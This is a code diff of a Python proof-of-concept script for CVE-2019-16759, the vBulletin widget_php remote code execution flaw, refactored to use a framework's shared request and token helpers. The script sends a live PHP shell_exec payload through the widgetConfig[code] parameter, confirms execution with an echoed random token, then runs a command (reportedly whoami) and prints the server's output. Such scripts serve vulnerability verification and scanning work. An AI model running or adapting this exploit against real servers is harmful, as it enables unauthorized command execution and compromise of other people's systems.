@@ -6,20 +6,13 @@ description: CVE-2019-16759漏洞可执行任意命令
 '''
 
 import sys
-import string
-import random
-import requests
-from urllib import request, parse
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2019_16759_BaseVerify:
      def __init__(self, url):
           self.url = url
-          self.capta = '' 
-          words=''.join((string.ascii_letters,string.digits))
-          for i in range(8):
-               self.capta = self.capta + random.choice(words) 
+          self.capta = get_capta() 
           self.check_data = {
                "routestring":"ajax/render/widget_php",
                "widgetConfig[code]": "echo shell_exec('%s'); exit;" % ('echo ' + self.capta)
@@ -32,10 +25,10 @@ class CVE_2019_16759_BaseVerify:
      def run(self):
           if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
-          check_req = requests.post(self.url, data = self.check_data, allow_redirects = False, verify = False)
+          check_req = request.post(self.url, data = self.check_data)
           try:
                if check_req.status_code == 200 and self.capta in check_req.text:
-                    cmd_req = requests.post(self.url, data = self.cmd_data, allow_redirects = False, verify = False)
+                    cmd_req = request.post(self.url, data = self.cmd_data)
                     print('CVE-2019-16759漏洞,执行whoami命令成功，执行结果为:', cmd_req.text)
                     return True
                else:
